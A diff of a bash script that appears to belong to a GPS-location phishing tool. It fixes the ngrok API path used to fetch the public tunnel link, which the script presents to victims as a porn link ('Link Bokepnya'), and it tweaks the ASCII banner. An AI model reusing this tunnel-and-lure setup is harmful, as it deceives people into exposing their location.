@@ -338,7 +338,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Start ngrok server...\n"
 ./ngrok http $port > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/aoi/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Link Bokepnya:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
@@ -383,12 +383,14 @@ done
 banner() {
 
 printf $ij"Hedy"
+
 printf "░██████╗░██████╗░░██████╗░░░░░░██╗░░░░░░█████╗░░█████╗░░█████╗░████████╗██╗░█████╗░███╗░░██╗"
 printf "██╔════╝░██╔══██╗██╔════╝░░░░░░██║░░░░░██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║"
 printf "██║░░██╗░██████╔╝╚█████╗░█████╗██║░░░░░██║░░██║██║░░╚═╝███████║░░░██║░░░██║██║░░██║██╔██╗██║"
 printf "██║░░╚██╗██╔═══╝░░╚═══██╗╚════╝██║░░░░░██║░░██║██║░░██╗██╔══██║░░░██║░░░██║██║░░██║██║╚████║"
 printf "╚██████╔╝██║░░░░░██████╔╝░░░░░░███████╗╚█████╔╝╚█████╔╝██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║"
 printf "░╚═════╝░╚═╝░░░░░╚═════╝░░░░░░░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝"
+printf
 printf "V.0.02 || thelinux"
 printf $ij"[$pu+$ij]$pu YouTube:https://www.youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA/featured"
 printf $ij"[$pu+$ij]$pu Github:https://github.com/WongBiasa"
